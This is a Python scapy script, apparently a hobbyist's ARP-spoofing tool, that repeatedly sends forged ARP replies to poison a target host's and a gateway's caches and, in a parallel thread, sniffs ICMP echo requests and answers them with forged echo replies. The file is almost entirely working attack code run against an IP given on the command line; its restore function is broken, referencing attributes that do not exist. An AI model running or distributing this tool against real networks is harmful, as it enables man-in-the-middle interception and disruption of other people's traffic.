#!/usr/bin/env python3


from scapy.layers.inet import IP    #from scapy.all import *
import scapy.all as scapy
import os
import sys
import time
import threading




# Enable IP forwarding on the attacker's machine
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
	packet = scapy.ARP(op = 2, 
                        pdst = target_ip, 
                        hwdst = get_mac(target_ip), 
                        psrc = spoof_ip)
	scapy.send(packet, verbose = False)
	time.sleep(1)
	
def arp_spoof():
    sent_packets_count = 0
    while True:                                         # keep sending ARP spoofing packets until interrupted
        spoof(target_ip, gateway_ip)                    # send an ARP spoofing packet to the victim device
        spoof(gateway_ip, target_ip)                    # send an ARP spoofing packet to the gateway
        sent_packets_count = sent_packets_count + 2     # two packets sent
        print("\r[*] Packets Sent "+str(sent_packets_count), end="")


def send_icmp_response(pkt):
    # Create the ICMP response packet
	resp = scapy.IP(dst=pkt[IP].src, 
                    src=pkt[IP].dst)/scapy.ICMP(type='echo-reply', 
                    id=pkt[scapy.ICMP].id, 
                    seq=pkt[scapy.ICMP].seq)/pkt[scapy.ICMP].payload
	"""resp.show()"""
	scapy.send(resp , verbose = False)         # Send the response

def sniff_icmp(pkt):
	if scapy.ICMP in pkt and pkt[scapy.ICMP].type == 8:
		send_icmp_response(pkt)
		"""pkt.show()"""
  
def packet_sniffer():
	scapy.sniff(filter = "icmp", prn = sniff_icmp)

def restore(target_ip, attacker_ip):
	destination_mac = get_mac(scapy.destination_ip)
	source_mac = get_mac(scapy.source_ip)
	packet = scapy.ARP(op = 2, pdst = scapy.destination_ip,
                       hwdst = destination_mac, 
                       psrc = scapy.source_ip,
                       hwsrc = source_mac)
	scapy.send(packet, verbose = False)

"""----------------------------------------------------------------------main"""

if len(sys.argv) < 2:
    print("Usage: ./arp_spoofing.py [target_ip]")
    sys.exit()   
target_ip = sys.argv[1]
gateway_ip = "192.168.0.50"
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
attacker_ip = "192.168.0.198"
print("gateway\t", gateway_mac,"|", gateway_ip)
print("target\t", target_mac,"|", target_ip)

"""-------------------------------------------------Start the spoofing attack""" 
try:
    thread1 = threading.Thread(target=arp_spoof)
    thread2 = threading.Thread(target=packet_sniffer)
    thread1.start()
    thread2.start()
    time.sleep(2)
    """-----------------------------------------------------restore when done"""
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")



